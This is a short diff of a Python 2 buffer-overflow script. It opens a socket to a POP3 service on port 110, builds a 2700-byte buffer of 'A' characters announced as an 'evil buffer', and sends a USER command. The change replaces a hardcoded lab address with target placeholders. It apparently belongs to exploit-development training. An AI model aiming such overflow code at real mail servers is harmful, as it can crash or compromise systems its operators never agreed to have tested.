@@ -5,7 +5,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 buffer = 'A' * 2700
 try:
 	print "\nSending evil buffer..."
-	s.connect(('10.0.0.22',110))
+	s.connect(('targetip',targetport))
 	data = s.recv(1024)
 	s.send('USER username' +'\r\n')
 	data = s.recv(1024)
